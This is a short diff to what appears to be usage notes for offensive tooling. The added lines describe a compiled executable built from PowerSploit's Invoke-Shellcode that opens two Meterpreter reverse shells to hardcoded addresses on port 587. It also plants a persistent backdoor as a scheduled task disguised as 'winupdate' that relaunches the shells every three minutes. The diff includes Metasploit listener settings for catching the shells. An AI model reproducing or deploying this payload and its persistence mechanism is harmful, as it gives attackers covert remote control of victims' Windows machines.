@@ -48,6 +48,32 @@ set LHOST 0.0.0.0
 set LPORT 587
 set ExitOnSession false
 set EXITFUNC thread
+set AutoRunScript "migrate -f"
+exploit -j
+
+[powershell-https.exe]
+
+- Description: This is an implementation of "Invoke-Shellcode"
+               from Matthew Graeber's PowerSploit modules. It
+               was minified and implemented into a standalone
+               python script then compiled into an executable.
+
+- This will spawn 2 meterpreter shells to the following addresses:
+        172.16.42.2 587
+        172.16.42.3 587
+
+- It will also add a persistent backdoor to Windows that will spawn
+  these 2 shells every 3 minutes (schtasks /query /tn winupdate)
+
+- Use this in metasploit for a listener:
+
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 587
+set SessionCommunicationTimeout 0
+set ExitOnSession false
+set EXITFUNC thread
 set AutoRunScript ""
 exploit -j
+
 
